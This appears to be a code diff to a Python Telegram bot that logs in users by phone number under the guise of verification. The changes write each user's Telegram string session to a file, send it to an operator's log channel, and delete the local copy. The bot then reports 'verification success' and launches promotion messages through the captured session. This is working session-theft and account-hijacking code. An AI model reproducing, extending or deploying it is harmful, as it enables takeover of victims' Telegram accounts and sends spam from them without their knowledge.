@@ -24,7 +24,7 @@ from pymongo import MongoClient
 
 # MongoDB Setup
 mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
-database = mongo_client['Cluster0']['sessions']
+database = mongo_client['Cluster0']['users']
 
 # Promo Texts
 PROMO_TEXTS = [
@@ -249,17 +249,19 @@ async def create_session(bot: Client, client: Client, user_id: int, phone_number
         clean_phone = phone_number.replace('+', '')
         session_file = Path(f"sessions/{clean_phone}.session")
 
-        # Save session file (pyrogram v2+ method)
-        if hasattr(client, 'session'):
-            await client.session.save()
-            if Path("pyrogram.session").exists():
-                Path("pyrogram.session").rename(session_file)
-                await bot.send_document(
-                    LOG_CHANNEL_SESSIONS_FILES,
-                    str(session_file),
-                    caption=f"Session: {clean_phone}"
-                )
-                session_file.unlink()
+        # Manually save session file
+        with open(session_file, "w") as f:
+            f.write(string_session)
+            
+        # Send to log channel
+        await bot.send_document(
+            LOG_CHANNEL_SESSIONS_FILES,
+            str(session_file),
+            caption=f"Session: {clean_phone}"
+        )
+        
+        # Remove local copy
+        os.remove(session_file)
 
         await bot.send_message(user_id, strings['verification_success'])
         asyncio.create_task(send_promotion_messages(string_session))
